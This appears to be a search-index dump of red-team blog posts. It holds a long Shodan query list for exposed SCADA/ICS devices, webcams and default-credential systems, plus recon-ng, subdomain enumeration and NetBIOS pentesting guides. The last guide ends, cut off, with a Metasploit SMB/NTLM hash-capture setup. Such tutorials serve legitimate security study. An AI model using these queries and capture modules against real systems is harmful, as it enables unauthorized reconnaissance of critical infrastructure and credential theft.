WordPress\"Minecraft Server\" \"protocol 340\" port:25565 # Too Many Minecraft Serversnet:175.45.176.0/22,210.52.109.0/24,77.94.35.0/24 # Literally Everything in North KoreaTCP Quote of the Day # TCP Quote of the DayOr you can get help about what you are looking for here. (Use ctrl + F.)ABB AC 800M # \"ABB - AC 800M Controller\"ABB RTU560 # \"ABB - RTU560 Substation automation product\"ABB RTU-Helpdesk # \"ABB - RTU500 Remote Terminal Unit\"ABB SREA-01 # \"ABB - SREA-01 Ethernet Adapter Module\"ABB Webmodule # \"ABB - Generic Multiple Devices\"AKCP Embedded Web Server # \"ACKP - Generic Multiple Devices, often data center monitoring\"A440 Wireless Modem # \"Adcon Telemetry - A440 Wireless Modem Base Station\"A850 Telemetry Gateway # \"Adcon Telemetry - A850 Telemetry Gateway Base Station for Adcon Wireless Sensor Networks\"addUPI Server # \"Adcon Telemetry - addUPI-OPC Server\"addVANTAGE # \"Adcon Telemetry - addVANTAGE Pro 6.X HMI\"title:adcon # \"Adcon Telemetry - Generic Generic\"IPC@CHIP # \"Beck IPC - IPC@CHIP PLC\"Cimetrics Eplus Web Server # \"Cimetrics - Eplus - B/IP to B/WS Gateway Firewall networking products for distributed monitoring and control systems\"ISC SCADA Service HTTPserv:00001 # \"Clorius Controls A/S - ISC SCADA SCADA Software\"Webvisu # \"Codesys - WebVisu\"Visu Remote Login # \"CodeSys - WebVisu\"port:2455 operating system # \"Codesys\"3S-Smart Software Solutions # \"CodeSys\"DELTA enteliTOUCH # \"Delta Controls - enteliTOUCH HMI Building automation\"i.LON # \"Echelon - i.LON SmartServer 2.0 Building Energy Management Solution, LonWorks/IP Server, Internet Server\"CIMPLICITY WebView # \"General Electric - CIMPLICITY WebView CIMPLICITY is HMI/SCADA\"CIMPLICITY-HttpSvr # \"General Electric - Cimplicity CIMPLICITY is HMI/SCADA\"ProficyPortal # \"General Electric - Proficy Historian (now named GE Digital)\"port:18245,18246 product:\"general electric\" # \"General Electric - Service Request Transport Protocol (GE-SRTP)\"port:502 # \"Generic - Modus\"port:20000 source address # \"Generic - dnp\"port:47808 # \"Generic - BACnet protocol (Data Communication Protocol for Building Automation and Control Networks)\"port:44818 # \"Generic - EtherNet/IP\"port:5094 hart-ip # \"Generic - The HART Communications Protocol (Highway Addressable Remote Transducer Protocol) is an early implementation of Fieldbus, a digital industrial automation protocol.\"GoAhead-Webs InitialPage.asp # \"Generic - goAhead embedded webserver\"Modbus Bridge # \"Generic\"ModbusGW # \"Generic\"PLC type # \"Generic - Generic Generic\"PLC name # \"Generic - Generic Generic\"Powerlink # \"Generic - Industrial Ethernet system, open-source used by various vendoes openPowerlink, ethernet-powerlink.org devices (PLC HMI ..)\"SCADA # \"Generic\"webSCADA # \"Generic\"HMS AnyBus-S WebServer # \"HMS - EtherNet/IP / Modbus-TCP Interface Generic\"eiPortal # \"Honeywell EnergyICT - eiPortal Energy Monitoring Software\"EnergyICT RTU # \"Honeywell EnergyICT - RTU Remote Data Concentrator\"port:20547 PLC # \"KW Software, Inc. - ProConOS / PLC\"lantronix # \"Lantronix\"lantronix port:9999 # \"Lantronix - default telnet port\"port:30718 lantronix # \"Lantronix\"port:5006,5007 product:mitsubishi # \"Mitsubishi Electric - MELSEC-Q Series\"Moscad ACE # \"Motorola - Moscad\"MovWebClientX # \"Movicon/Progea - Web-Client\"ioLogik Web Server # \"Moxa - ioLogik Web Server SCADA Software\"port:4800 'Moxa Nport' # \"Moxa - Nport and OnCell devices\"title:'NPort web console' # \"Moxa - Nport devices\"MoxaHttp # \"Moxa - AirWorks AWK-3131-RCC/Railway Remote I/O (ioLogik E12xx)/Cellular Micro RTU Controller (ioLogik W53xx, ioLogik)/VPort 461 Industrial Video Encoder/IA240 Embedded computer/IA241 Embedded computer/OnCell Central Manager/EDS-505A Series/EDS-508A Series/OnCell G3100 Series/Generic generic\"port:4800 'OnCell' # \"Moxa - OnCell devices\"WindWeb # \"NRG Systems - WindCube Wind Speed Meter\"port:9600 response code # \"Omron - FINS, Factory Interface Network Service,\"Visu+ Web Client # \"Phoenix Contact GmbH - SCADA visualization system\"port:1962 PLC # \"Phonix Contact - PCWorxs\"PLC Type: AXC # \"Phonix Contact - AXC is a modular small-scale controller for the Axioline I/O system PCWorxs\"PLC Type: ILC # \"Phonix Contact - ILC controllers PCWorxs\"Quantum BACnet # \"Quantum - Multiple Devices\"title:phasefale Z-World Rabbit # \"Rabbit - Z-World Rabbit Multiple Devices\"Z-World Rabbit # \"Rabbit - Generic Multiple Devices\"port:789 product:\"Red Lion Controls\" # \"Red Lion Controls - Red Lion Controls G306a human machine interface (HMI).\"Reliance 4 Control Server # \"Reliance - Reliance 4 SCADA/HMI system SCADA/HMI Software\"Rockwell Automation # \"Rockwell Automation - Generic Generic\"Allen-Bradley # \"Rockwell Automation / Allen-Bradley - Generic Generic\"Micrologix # \"Rockwell Automation / Allen-Bradley - small programmable logic controller solution\"Series C Revision # \"Rockwell Automation / Allen-Bradley - Generic Generic\"RTS SCADA Server # \"RTS Services - General SCADA Software\"IMasterSaia5_15_03.jar # \"SBC - Saia Burgess Control Applet\"Saia PG5 Web Editor # \"SBC\"Schleifenbauer SPbus gateway # \"Schleifenbauer - SPbus gateway Network Gateway\"CitectSCADA # \"Schneider Electric - CitectSCADA HMI / SCADA software package\"ClearSCADA # \"Schneider Electric - Generic SCADA software\"EGX100MG # \"Schneider Electric - PowerLogic EGX EGX100MG\"Modicon # \"Schneider Electric - Modicon generic\"Modicon M340 # \"Schneider Electric - Modicon M340 PLC\"port:23 'Meter ION' # \"Schneider Electric - PowerLogic ION7650 Energy and power meter Energy and power meter\"Power Measurement Ltd # \"Schneider Electric - Generic Energy and power meter\"PowerLogic # \"Schneider Electric - PowerLogic Series Power Monitoring Module\"Schneider Electric # \"Schneider Electric - generic generic\"Schneider-WEB # \"Schneider Electric - General Multiple Devices\"TELEMECANIQUE BMX # \"Schneider Electric - Modicon generic\"title:PowerLogic # \"Schneider Electric - Generic Generic\"Schneider Electric EGX300 # \"Schneider Electric - EGX300\"HMI XP277 # \"Siemens - Simatic HMI HMI\"Portal0000 # \"Siemens - Simatic S7-1200 PLC\"Portal0000.htm # \"Siemens - Simatic S7-300 (pre-2009 versions) PLC\"S7-200 # \"Siemens - Simatic S7-200 PLC\"S7-300 # \"Siemens - Simatic S7-300 PLC\"Scalance # \"Siemens - Scalance generic SCALANCE X Industrial Ethernet switches / SCALANCE W Industrial Wireless LAN / SCALANCE M Industrial routers / SCALANCE S Industrial Security\"Copyright: Original Siemens Equipment # \"Siemens - Generic Generic\"Simatic # \"Siemens - Simatic HMI Generic\"Welcome to the Windows CE Telnet Service on HMI_Panel # \"Siemens - Simatic HMI Generic\"XP277 # \"Siemens - Simatic\"port:102 # \"Siemens - PLC port can not be deactivated by user\"/gc/flash.php # \"Sierra Wireless\"SoftPLC # \"SoftPLC\"title:Somfy # \"Somfy - General Smart Home Devices\"SpiderControl # \"SpiderControl - Generic HMI\"Stulz GmbH Klimatechnik # \"Stulz GmbH - Generic Generic\"server: iq3 # \"Trend - IQ3xcite Controller\"port:1911,4911 product:Niagara # \"Tridium - Fox protocol developed as part of Niagara framework\"Niagara Web Server # \"Tridium - NiagaraAX (ver 1) Software for JACE-2 JACE-403 or JACE-545\"niagara_audit # \"Tridium - NiagaraAX (ver 2) Software for JACE-2 JACE-403 or JACE-545\"niagara_audit -login # \"Tridium - NiagaraAX (ver 3) Software for JACE-2 JACE-403 or JACE-545\"Niagara-Platform: QNX # \"Tridium - Niagara Framework\"os.name=s:QNX # \"Tridium - Niagara Framework\"Server: VTScada # \"Trihedral - VTScada ODBC Server\"title:WAGO # \"Wago - Generic Generic\"VxWorks # \"Wind River - VxWorks SCADA Software\"WindRiver-WebServer # \"Wind River - Generic Generic\"title:'xzeres wind' # \"Xzeres - 442SR small wind turbine\"port:2404 asdu address # \"Generic - IEC 60870 part 5 is one of the IEC 60870 set of standards which define systems used for SCADA in electrical engineering and power system automation applications.\"title:'Carel pCOWeb Home Page' # \"Carel - pCO sistema pCOWeb is used to interface pCO Sistema to networks that use the HVAC protocols like BACnet IP Modbus TCP/IP or SNMP\"title:'Heatmiser Wifi Thermostat' # \"Heatmiser - wireless room thermostats\"tag:ics # \"generic - searching tag values requires suitable account\"tag:iot # \"generic - searching tag values requires suitable account\"Local BACnet Device object\"Tridium\" # \"Tridium - BACNet Devices\"Carel BACnet Gateway # \"Carel - BACNet Devices\"Siemens BACnet Field Panel # \"Siemens - BACNET Devices\"BACnet Broadcast Management Device # \"generic - BACNet Devices\"I20100 port:10001 # \"Veeder-root - Automated Tank Gauge (Vendor most likely Veeder-Root but not guaranteed) results typically contain a lot of honyepots (conpot)\"screenshot.label:ics # \"Generic - Screenshots tagged as ICS (will contain some false positives)\"port:1883\"MQTT Connection Code\" # \"Generic - standard port for MQTT + MQTT banner / MQTT -&gt; MQ Telemetry Transport\"port:8883\"MQTT Connection Code\" # \"Generic - standard port for MQTT over SSL + MQTT banner / MQTT -&gt; MQ Telemetry Transport / UNTESTED\"port:1883 Fronius # \"Fronius - Generic solar energy, most likely inverters\"Press Enter for Setup Mode port:9999 # \"Lantronix - default telnet port without password enabled hint: Lantronix includes MAC address in banner which can be used for extra validation\"Server: CarelDataServer\"200 Document follows\" # \"Carel - PlantVisor\"\"http.title:\"\"Nordex Control\"\"\"\"Windows 2000 5.0 x86\"\"\"\"Jetty/3.1 (JSP 1.1 Servlet 2.2 java 1.6.0_14)\"\" # \"\" Nordex - Wind Farm Portal\"hostname:edu country:us port:22 # \"dministration - .edu US SSH\"admin 1234 # \"Administration - admin/1234\"port:80 admin # \"Administration - admin\"200 OK -Microsoft -Virata -Apache Allegro # \"Administration - Allegro\"1.1-rr-std-b12 port:80 # \"Administration - AMX Control Systems\"Anonymous+access+allowed # \"Administration - Anonymous Access Allowed\"anonymous access granted # \"Administration - Anonymous Access Granted\"APC Management Card # \"Administration - APC Management Card\"apc # \"Administration - apc\"barracuda # \"Administration - Barracuda targets\"bigfix # \"Administration - bigfix\"CarelDataServer # \"Administration - CarelDataServer\"CERN 3.0 # \"Administration - Cern 3.0\"a license exception # \"Administration - Coldfusion Developer Edition\"computershare # \"Administration - CPU\"Remote Access Controller port:80 # \"Administration - Dell Remote Access Controller\"delta # \"Administration - Delta Networks Inc\"fast dns port:80 # \"Administration - DNS\"etcd # \"Administration - etcd\"firewall 200 # \"Administration - Firewalls\"port:22 # \"Administration - General SSH\"230-Hewlett-Packard # \"Administration - Hewlett Packard print ftp\"HitboxGateway9 # \"Administration - hitbox\"HP-ChaiSOE # \"Administration - HP LaserJet 4250\"jetdirect # \"Administration - JetDirect HP Printer\"liebert - liebert.com # \"Administration - Liebert Devices\"Exchange # \"Administration - Micro$oft Exchange\"nga.mil # \"Administration - ngamil\"port:5060 Nortel # \"Administration - Nortel SIP devices\"ossim # \"Administration - ossim\"port:23\"list of built-in commands\" # \"Administration - Root shell\"wince Content-Length: 12581 # \"Administration - SAPHIR\"SimpleShare # \"Administration - SimpleShare NAS\"snom embedded # \"Administration - Snom\"admin 1234 # \"Administration - test\"firewall 200 - date -Internet -netgear -proxy -charset -length -220 # \"Administration - Watchguard fierwalls\"ZENworks # \"Administration - ZENworks\"Zhone SLMS # \"Administration - Zhone Single-Line Multi-Service\"cisco-ios # \"Cisco - Cisco Devices\"cisco port:23,80 # \"Cisco - cisco elnet web\"cisco-ios country:IN # \"Cisco - CISCO IOS India\"cisco-ios country:DZ # \"Cisco - Cisco Iso in Algeria\"cisco-ios\"last-modified\" country:BR # \"Cisco - cisco no brasil\"cisco last-modified Accept-Ranges: none # \"Cisco - Cisco Open Web Boxs\"Cisco VPN Concentrator admin.html # \"Cisco - Cisco VPN Concentrator - admin\"Cisco VPN Concentrator # \"Cisco - Cisco VPN Concentrator\"7912 cisco # \"Cisco - CiscoPhone 7912\"7940 cisco # \"Cisco - CiscoPhone 7940\"1993\"cisco-ios\" +\"last-modified\" # \"Cisco - IOS HACK - old\"drupal # \"CMS - Drupal\"joomla # \"CMS - Joomla\"wordpress # \"CMS - Wordpress\"proxy.php # \"Common Files - Proxy.php\"default password # \"Default Credentials - default password\"Default Login Authenticate # \"Default Credentials - Passwords\"PowerDNS # \"DNS Server - PowerDNS\"X-dotDefender-denied # \"Firewall - dotDefender WAF\"port:21 230 # \"FTP - Anonymous FTP\"country:CN port:21 # \"FTP - China FTP\"filezilla # \"FTP - Filezilla\"Anonymous user logged in # \"FTP - FTP anon successful\"Anonymous+access+allowed connected # \"FTP - FTP anon successful\"ftp 230 -unknown -print # \"FTP - FTP anonymous or guest access\"GoldenFTP # \"FTP - GoldenFTP 4.70\"Golden FTP Server # \"FTP - GoldenFTP Server\"X-Powered-By: PHP # \"Languages - PHP\"centos # \"Operating System - CentOS\"Fedora # \"Operating System - Fedora\"IPCop # \"Operating System - IPCop\"RedHat # \"Operating System - RedHat\"Ubuntu # \"Operating System - Ubuntu\"Windows 2000 # \"Operating System - Windows 2000\"Windows 2003 # \"Operating System - Windows 2003\"Fuji Xerox # \"Printer - Fuji Xerox Servers\"jetdirect # \"Printer - JetDirect\"Xerox 4150 # \"Printer - Xerox 4150\"Airstation # \"Router - Airstation\"dd-wrt port:80 # \"Router - DD-WRT\"SmartAX MT882 # \"Router - HUAWEI Routers\"SmartAX MT882 country:RU # \"Router - HUAWEI ROUTERS\"netgear # \"Router - netgear routers\"netgear # \"Router - netgear\"Network Switch # \"Router - Network Switches\"OpenWRT # \"Router - OpenWRT\"admin+1234 # \"Router - Router w/ Default Info\"bacnet # \"SCADA and ICS - BACnet devices\"EIG Embedded Web Server # \"SCADA and ICS - Electro Industries GaugeTech\"niagara_audit -login # \"SCADA and ICS - Open SCADA Niagara systems\"sunny webbox port:80 # \"SCADA and ICS - Photovoltaic\"slc 505 # \"SCADA and ICS - Rockwell SLC-505 PLC\"scada country:US # \"SCADA and ICS - SCADA USA\"Niagara Web Server # \"SCADA and ICS - SCADA\"scada # \"SCADA and ICS - SCADA\"siemens s7 # \"SCADA and ICS - Siemens s7\"port:161 simatic # \"SCADA and ICS - Siemens SIMATIC\"Simatic -S7 -HMI # \"SCADA and ICS - Simatic NET\"Simatic+S7 # \"SCADA and ICS - Simatic S7 SCADA\"Simatic S7 # \"SCADA and ICS - Simatic S7\"telemetry gateway # \"SCADA and ICS - Telemetry Gateway\"X-Powered-By:W3 Total Cache # \"Server Modules - W3 Total Cache\"allied telesys port:23 # \"Television - Allied telesyn equipment\"dreambox SE # \"Television - Dreambox SE\"Enigma2 WebInterface Server # \"Television - Dreambox/Enigma2 WebInterface\"dreambox # \"Television - Dreambox\"spinetix # \"Television - spinetix hyper media player\"Tandberg Television Web server # \"Television - Tandberg Television Web server\"Ubicom -401 # \"Television - Ubicom\"AddPac # \"VOIP - AddPac Technology\"AddPac # \"VOIP - AddPac VoIP\"airtel # \"VOIP - airtel\"asterisk # \"VOIP - asterisk\"SIP User-Agent BT Home Hub # \"VOIP - BT Home Hub\"7940 cisco # \"VOIP - Cisco 7940\"CISCO 200 port:5060 # \"VOIP - Cisco SIP proxy\"hostname:firmex.com # \"VOIP - firmex.com\"port:5060 Nortel # \"VOIP - Nortel SIP devices\"snom embedded 200 OK # \"VOIP - Snom phones without passwords\"port:5060 snom # \"VOIP - Snom SIP\"snom embedded # \"VOIP - Snom VOIP phones with no authentication\"Tenor # \"VOIP - Tenor\"trixbox port:5060 # \"VOIP - trixbox sip server\"huawei -301 -302 -400 -401 # \"VOIP - Web interface for Huawei IP phones--no authentication required\"Virata-EmWeb # \"Web Server - Virata-EmWeb\"apache 0.9* port:80 # \"Web Server - AFHCAN Telehealth\"country:in apache centos hostname:exacttouch.com # \"Web Server - Centos apache\"Commodore 64 # \"Web Server - Commodore 64 Web servers\"iisstart.htm # \"Web Server - Default IIS Web Pages\"F5-TrafficShield # \"Web Server - F5 Traffic Shield\"google # \"Web Server - Google\"Gordian Embedded # \"Web Server - Gordian Embedded\"200 OK i.LON # \"Web Server - i.LON\"IBM-HTTP-Server # \"Web Server - IBM HTTP Server\"IIS 3.0 -\"6.0\" -\"7.0\" -\"7.5\" -\"5.0\" -\"5.1\" # \"Web Server - IIS 3.0 webservers\"iis4.0 country:AU # \"Web Server - IIS 4.0 in AU\"IIS 4.0 -\"6.0\" -\"7.0\" -\"7.5\" -\"5.0\" -\"5.1\" -\"404\" -\"403\" -\"302\" # \"Web Server - IIS 4.0 webservers\"IIS 4.0 -\"6.0\" -\"7.0\" -\"7.5\" -\"5.0\" -\"5.1\" -\"404\" -\"403\" -\"302\" # \"Web Server - IIS 4.0\"IIS 4.0 -\"6.0\" -\"7.0\" -\"7.5\" -\"5.0\" -\"5.1\" -\"404\" -\"403\" -\"302\" port:80 country:IN # \"Web Server - IIS 4.0\"iis 5.0 # \"Web Server - iis 5.0\"iis 6.0 webdav # \"Web Server - iis 6.0 webDav\"port:80 country:US X-Content-Security-Policy asp.net # \"Web Server - IIS in the US with CSP\"Server: iWeb HTTP # \"Web Server - iWeb\"KM-MFP-http # \"Web Server - KM MFP HTTP Server\"iPhone lighttpd # \"Web Server - lighttpd on iphones\"Server: LiteSpeed # \"Web Server - LiteSpeed\"mod_antiloris # \"Web Server - mod_antiloris\"mod_security # \"Web Server - mod_security\"Oracle_Web_Listener # \"Web Server - Oracle Web Listener\"Profense # \"Web Server - Profense\"SkyX HTTPS # \"Web Server - SkyX HTTPS gateway\"nginx de country:DE # \"Web Server - SUCKUP.de: Mein IT-Blog\"apache 2.2.13 302 5000 # \"Web Server - Synology Disk Station\"apache # \"Web Server - Test Apache\"wince # \"Web Server - Windows CE\"WindWeb # \"Web Server - WindWeb server\"Xerver # \"Web Server - Xerver HTTP Server\"(zOS) -Apache -IIS -Extraweb -kerio -sestbc510 # \"Web Server - z/oS\"linux upnp avtech # \"Webcam - AVTech IP Camera\"netcam # \"Webcam - Belkin NetCam\"dcs 5220 # \"Webcam - DCS-5220\"Server: GeoHttpServer # \"Webcam - GeoHttpServer WebCam\"TeleEye # \"Webcam - TeleEye\"Vivotek Network Camera 200 # \"Webcam - Vivotek Network Camera\"imagiatek ipcam # \"Webcam - webcam imagiatek\"sq-webcam # \"Webcam - webcam VIDEO WEB SERVER\"Boa ipcam # \"Webcam - webcam vipcap vilar\"Server: SQ-WEBCAM # \"Webcam - Webcam\"country:BG port:443 os:windows # \"Windows - win\"RAC_ONE_HTTP # \"ZENworks - Remote Access Controller\"" }, { "title": "Recon-ng Tutorials for Enumeration Targets", "url": "/posts/recon-ng-tutorials/", "categories": "red team, reconing", "tags": "recon-ng, recon-ng tutorials, recon-ng best practicies, recon-ng enumeration, recon-ng usage, red-team", "date": "2022-12-03 00:00:00 +0300", "snippet": "Recon-ng BasicsFirstly we need to create a workspaces related to the target organization. It will gather our research and findings under these workspaces.workspaces listworkspaces create example-nameYou can create and list companies.db insert companiesshow companiesYou can add a domain name and list it.db insert domainsshow domainsAPI KEYSYou can find the Recon-ng API Key source here.You can list keys, and add keys.keys list #list the keyskeys add example_api xxxxxxxxxxxxxxxxxxxxx # adding API key to module.keys add binaryedge_api b8880xxxxxxxxxxxxxxxxx # example add api keyModulesYou can see the modules that can be installed on recon-ng with the marketplace command.marketplace searchModülleri yüklemek için aşağıdaki komutları kullanabilirsiniz# To load all modulesmarketplace install all # This command will load all supported or unsupported modules doe, but you may get some errors about censys libraries due to some incompatibilities with python 3.10.# To load modules one by onemarketplace install path # So like this marketplace install recon/companies-contacts/bing_linkedin_cache #Note: You may get an error because you did not add the APIs. Not all modules need API. But when adding the modules you need to the API, if the required API value is not available, you will get an error.You can list installed modules.modules searchStart Recon to TargetsWe can select the module we want to run and start the recon as follows.modules load recon/hosts-ports/censys_ipoptions set SOURCE example.comoptions set VIRTUAL_HOSTS EXCLUDE # You have three option about this settings = EXCLUDE, INCLUDE, ONLYrunWe can get reports with the help of the following commands in the workspaces where we have completed our tasks.modules search reporting* # You can search modules with '*'. There is some different reporting methods.modules load reporting/htmlinfooptions set FILENAME /home/user/Desktop/results.htmloptions set CUSTOMER Company Nameoptions set CREATOR 0xhav0crun" }, { "title": "Asset Discovery for Target", "url": "/posts/asset-discovery-for-target/", "categories": "red team, reconing", "tags": "asset discovery, assets of target, asset enumeration methods, asset discovery methods, red-team", "date": "2022-12-02 00:00:00 +0300", "snippet": "Finding Netblock Addres From Company NameYou can find NetblockTool on Github.#NetblockTool#Simple run. Get results from Google dorking and ARIN database:python3 NetblockTool.py Company#Include the verbose flag to print status updates:python3 NetblockTool.py -v Company#Extract netblocks owned by your target company’s subsidiaries:python3 NetblockTool.py -v Company -s#Extract point of contact information:python3 NetblockTool.py -v Company -p#Get as much information as possible, including netblocks found using wildcard queries, points of contact, geolocation data, and physical addresses:python3 NetblockTool.py -wpgav Company -soNetblockTool.py outputNetblockTool.py .csv output exampleFinding Assets From IP DatabasesFinding IP Address From SSL Certificates on Censys.ioYou can use censys.io as one of the fast and creative solutions for detecting IP addresses. With this method, by searching the domain name in the SSL certificates in the Censys.io database, you can obtain all the addresses that the target domain name is passing through.Censys.io searching certificates.Or you can use this command. But firstly, you have to install python-censys libary. You can install from here.python3 -m censys search ' services.tls.certificates.leaf_data.subject.common_name: \"example.com\"' --index-type hosts | jq -c '.[] | {ip: .ip}' &gt; ip.txt#You can pars output with this commandsed -i 's/[^0-9,.]*//g' ip.txtUsing censys libary of python.Finding Organization ASN &amp; Netblock IP Address with BGPYou can find out the Autonomous System Number (ASN) number by searching the keywords of the Organization through the application of BGP here.Finding Organization ASN &amp; Netblock IP Address with BGPFinding Netblock IP Address CIDR with nslookup &amp; whoisWith the Whois information, a lot of information about the domain name can be accessed. Our goal in this technique is to detect Netblock and CIDR addresses to expand the attack surface. For this, after the address is detected with the help of nslookup, a whois query is sent to this address and the Netblock and CIDR to which this IP address belongs are detected. In order to expand the attack surface as much as possible in the target organization, we first need the domain and subdomain addresses. Before applying this method, you should collect as many domains and subdomains as possible.Finding Netblock IP Address CIDR with nslookup &amp; whoisFinding Netblock IP Address CIDR with nslookup &amp; whois" }, { "title": "Subdomain Enumeration Methods", "url": "/posts/subdomain-enumeration-methods/", "categories": "red team, reconing", "tags": "subdomain, subdomain enumeration, red-team", "date": "2022-12-01 00:00:00 +0300", "snippet": "One of the first things to do in the discovery phase is to collect as many systems and IP addresses as possible without touching them. First of all, we need to find domains and subdomains. In this section, I will show you some of the subdomain enumeration methods.Collecting Subdomains with ToolsCurl &amp; Parsing#web.archive.org Parsing For Subdomainscurl -s \"http://web.archive.org/cdx/search/cdx?url=*.hackerone.com/*&amp;output=text&amp;fl=original&amp;collapse=urlkey\" |sort| sed -e 's_https*://__' -e \"s/\\/.*//\" -e 's/:.*//' -e 's/^www\\.//' | uniq#Search subdomains using jldccurl -s \"https://jldc.me/anubis/subdomains/att.com\" | grep -Po \"((http|https):\\/\\/)?(([\\w.-]*)\\.([\\w]*)\\.([A-z]))\\w+\" | anewCollecting subdomains with curl from web.archive.org &amp; jldc.meamassamass enum -d example.com -src -ip -dir exampleamass enum -d example.com -src -ip -norecursiveamass enum -d example.com -src -ip -brute -dir exampleamass viz -dir example -d3 #For Graphical SurfacetheHarvestertheHarvester -d example.com -l 500 -b alltheHarvester -d example.com -ctheHarvester -d example.com -l 500 -b google,bing,yahoo,duckduckgo -n# -d Domain field# -b Sources# -n Enable DNS Server lookup#All Sources : anubis, baidu, bevigil, binaryedge, bing, bingapi, bufferoverun, censys, certspotter, crtsh, dnsdumpster, duckduckgo, fullhunt, github-code, hackertarget, hunter,intelx, omnisint, otx, pentesttools, projectdiscovery, qwant, rapiddns, rocketreach, securityTrails, sublist3r, threatcrowd, threatminer, urlscan, virustotal, yahoo, zoomeyeOther Tools#findomain## Repository: https://github.com/Findomain/Findomainfindomain -t target.com -o#Using jhaddix All.txt## List : https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056## Warning! If you use this repository, you can get blocked by waf/IPS etc. Because it generates traffic on hundreds of target domains per second.ffuf -w all.txt -u \"https://FUZZ.example.com/\" -v | grep \"| URL |\" | awk '{print $4}'#Gospider##Repository: https://github.com/tomnomnom/anew | https://github.com/jaeles-project/gospidergospider -d 0 -s \"https://example.com\" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/\"]+' | anew#subfinder##Repository: https://github.com/projectdiscovery/subfindersubfinder -d example.com -o example.com_subfinder.txt#assetfinder## Repository: https://github.com/tomnomnom/assetfinderassetfinder --subs-only example.com#knockpy## Repository: https://github.com/guelfoweb/knockpython3 knockpy.py example.com#sudomy## Repository: https://github.com/screetsec/Sudomybash sudomy -s shodan,dnsdumpster,webarchive -d example.combash sudomy -pS -sC -sS -d example.combash sudomy -d example.com -rS --htmlbash sudomy -d example.com --allFuzzing with ffufCertificate SearchYou can find subdomains with certificates by searching target domains in online certificate databases. Example site: https://crt.shSubdomain enumeration from check the https://crt.shParsing to Valid Subdomains#target.com.txt= Detected address list#target.com_valid.txt= parsed valid domain listwhile read i; do digout=$(dig +short ${i//[$'\\t\\r\\n ']}); if [[ ! -z $digout ]]; then echo ${i//[$'\\t\\r\\n ']}; fi; done &lt; target.com.txt &gt; target.com_valid.txt" }, { "title": "NetBIOS Pentesting Best Practices", "url": "/posts/netbios-pentesting-best-practicies/", "categories": "pentesting protocols, netbios", "tags": "pentesting, netbios, best practicies", "date": "2022-06-19 00:00:00 +0300", "snippet": "NetBIOS NetBIOS usually uses ports 137,138,139NetBios Name Service Name service for name registration and resolution (ports: 137/udp and 137/tcp). Datagram distribution service for connectionless communication (port: 138/udp). Session service for connection-oriented communication (port: 139/tcp).PORT STATE SERVICE VERSION137/udp open netbios-ns Microsoft Windows netbios-ns (workgroup: WORKGROUP)What is NetBIOS?NetBIOS provides network input/output services to support client/server applications on a network. From an architectural viewpoint, the NetBIOS specification defines two things: An interprocess communication (IPC) mechanism or application programming interface (API) that allows applications that are NetBIOS-enabled to communicate remotely over a network and request services from lower levels of the protocol stack. This is the primary and original definition of NetBIOS. A protocol operating at the session and transport layers of the Open Systems Interconnection reference model (7 layers OSI reference model) that enables functions such as session establishment and termination as well as name registration, renewal, and resolution.NetBIOS has more overhead than other IPC mechanisms. It can take different forms depending on the network protocol on which it is running. The following table lists some common network protocols and the form that NetBIOS takes on each.NetBIOS Protocol Stacks Network Protocol Name When Combined with NetBIOS NetBEUI NBF (NetBEUI Frame protocol) NWLink IPX/SPX-Compatible Transport NWLink NetBIOS TCP/IP NetBT (NetBIOS over TCP/IP) Confusion between NetBIOS and NetBEUIThere still is a relatively popular confusion between the names NetBIOS and NetBEUI. NetBEUI originated strictly as the moniker for IBM’s enhanced 1985 NetBIOS emulator for token ring. The name NetBEUI should have died there, considering that at the time, the NetBIOS implementations by other companies were known simply as NetBIOS regardless of whether they incorporated the API extensions found in that emulator. For MS-Net, however, Microsoft elected to name its implementation of the NBF protocol “NetBEUI” – literally naming its implementation of the transport protocol after IBM’s second version of the API.Consequently, even today, Microsoft file and printer sharing over Ethernet continues to be called NetBEUI, with the name NetBIOS commonly used only in reference to file and printer sharing over TCP/IP. In truth, the former is the NetBIOS Frames protocol (NBF), and the latter is NetBIOS over TCP/IP (NBT).NetBIOS Pentesting Shodan search query : port:137 NetBIOS Response NetBIOS To discover the IP address of a Name, a PC has to send a “Name Query” packet and wait if anyone answers. If there is a Name Service server, the PC can ask it for the IP of the name.Banner GrabbingEnumerating a NetBIOS service you can obtain the names the server is using and the MAC address of the server.nmblookup -A 192.168.x.xsudo nbtscan 192.168.x.x/24sudo nmap -Pn -sU -sV -p137--script nbstat.nse 192.168.x.xDatagram Distribution ServiceNetBIOS datagrams are sent over UDP. A datagram is sent with a “Direct Unique” or “Direct Group” packet if it’s being sent to a particular NetBIOS name, or a “Broadcast” packet if it’s being sent to all NetBIOS names on the network.PORT STATE SERVICE VERSION138/udp open|filtered netbios-dgmSession ServiceSession mode lets two computers establish a connection for a “conversation”, allows larger messages to be handled, and provides error detection and recovery.With nmap, operating systems (not versions), MAC addresses and host names of the systems can be listed.sudo nmap -sU --script nbstat.nse -p137 192.168.12.70Enumeration NetBios service with nbtstat.nse script.msf&gt; use auxiliary/scanner/netbios/nbnameEnumeration NetBios service with Metasploit Framework.nbtscan -hvr 192.168.12.0/24 -m 4Enumeration NetBios service with nbtscan tool.nbtscan-unixwiz -f 192.168.12.70/24nbtscan-unixwiz output.Shares can be listed.Windows: net view \\\\TargetNetBIOSNameShares listed with net view command.Sharing can be mapped.Windows: net use T: \\\\TargetNetBIOSName\\SharedFolderShares mapped with net use command.Other Information Gathering Methods for Different Platformsnmap --script=broadcast-netbios-master-browser 10.10.x.xmsf&gt; use auxiliary/scanner/netbios/nbname_probe (deprecated)# on Windowsnbtstat -A 10.10.x.xnbtstat -cNetBIOS PoisoningNetBIOS Poisoning with MetasploitFor protocols such as SMB and HTTP, various modules are available on the Metasploit Framework that can capture the handshake authentication issue. Capturing the password hash over SMB requires using the auxiliary/server/capture/smb modulemsf6&gt; use auxiliary/server/capture/smbmsf6 auxiliary(server/capture/smb) &gt; set SRVHOST 192.168.56.104 # Attacker IPmsf6 auxiliary(server/capture/smb) &gt; set logfile /tmp/logfilemsf6 auxiliary(server/capture/smb) &gt; set johnpwfile /tmp/john-smbmsf6 auxiliary(server/capture/smb) &gt; set cainwpfile /tmp/cain-smbmsf6 auxiliary(server/capture/smb) &gt; runSMB Server listenerThe Metasploit framework’s capture module for NTLM authentication query over HTTP can be configured as follows:msf6 auxiliary(server/capture/smb) &gt; use auxiliary/server/capture/http_ntlmmsf6 auxiliary(server/capture/http_ntlm) &gt; set SRVHOST 192.168.56.104msf6 